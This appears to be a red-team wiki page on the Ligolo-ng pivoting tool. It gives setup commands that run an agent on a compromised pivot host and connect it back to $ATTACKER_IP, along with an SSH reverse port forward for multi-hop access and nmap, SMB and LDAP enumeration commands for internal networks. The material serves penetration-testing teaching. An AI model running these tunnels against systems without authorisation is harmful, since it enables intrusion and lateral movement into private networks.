---
authors: felixbillieres, H4tsuM1ku
category: infra
---

# Ligolo-ng

## Theory

Ligolo-ng is a modern VPN-like pivoting tool that uses TUN interfaces to provide transparent network access. Unlike traditional SOCKS proxies, Ligolo-ng doesn't require proxychains or tool-specific proxy configuration.

**Use when:**
* Full network access is needed
* Best tool compatibility is required
* AD tools, LDAP, SMB need to work correctly
* Multi-hop scenarios are required

**Advantages:**
* Transparent network access (no proxychains)
* Best tool compatibility
* Automatic routing in multi-hop scenarios
* Works with all protocols (TCP, UDP, ICMP)

## Practice

### Prerequisites

* TUN interface support on attacker machine (Linux/macOS/WSL2)
* Agent binary on pivot host
* Network connectivity between attacker and pivot host

### Setup

**Attacker machine:**

```bash
# Download from: https://github.com/nicocha30/ligolo-ng/releases
# Example for v0.4.4:
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_linux_amd64.tar.gz

# Start Ligolo-ng proxy server
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

> [!NOTE]
> Windows requires WSL2, a Linux VM, or a TUN/TAP driver for TUN interface support.

**Pivot host:**

```bash
# Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_linux_amd64 -O agent
chmod +x agent
./agent -connect $ATTACKER_IP:11601 -ignore-cert

# Windows
# Download ligolo-ng_agent_windows_amd64.exe
.\ligolo-ng_agent_windows_amd64.exe -connect $ATTACKER_IP:11601 -ignore-cert
```

### Usage

**Add routes:**

```bash
# In Ligolo-ng proxy interface
ligolo-ng > session
ligolo-ng > ifconfig routes add $TARGET_NETWORK/$CIDR
ligolo-ng > ifconfig routes add 192.168.1.0/24
```

**Tools work directly:**

```bash
# No proxychains needed
nmap -sn 192.168.1.0/24
nmap -sV -p- $TARGET
nmap -O 192.168.1.0/24
gobuster dir -u http://$TARGET -w /path/to/wordlist.txt
smbclient -L //$TARGET -U $USER
ldapsearch -x -H ldap://$TARGET -D "$DOMAIN\\$USER" -w $PASSWORD -b "DC=$DOMAIN,DC=local"
```

### Multi-hop

For multi-hop scenarios, see [Multi-hop pivoting](../../multi-hop.md#multi-hop-with-dynamic-port-forwarding).

**Quick setup:**

```bash
# Attacker: single proxy server
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot1
./agent -connect $ATTACKER_IP:11601 -ignore-cert

# Pivot2 (if can reach attacker directly)
./agent -connect $ATTACKER_IP:11601 -ignore-cert

# Pivot2 (if behind pivot1 - port forward first)
# On pivot1:
ssh -N -R 11601:localhost:11601 $USER@$ATTACKER_IP
# Then on pivot2:
./agent -connect $PIVOT1_IP:11601 -ignore-cert

# In Ligolo-ng interface
ligolo-ng > ifconfig routes add 192.168.1.0/24  # Via pivot1
ligolo-ng > ifconfig routes add 10.0.0.0/24      # Via pivot2
```

## Resources

* [Choosing a technique](../choosing-a-technique.md) - When to use Ligolo-ng
* [Multi-hop pivoting](../../multi-hop.md) - Multi-hop scenarios
* [Operations](../../operations.md) - Using Ligolo-ng
* [Persistence](../../persistence.md) - Maintaining Ligolo-ng access

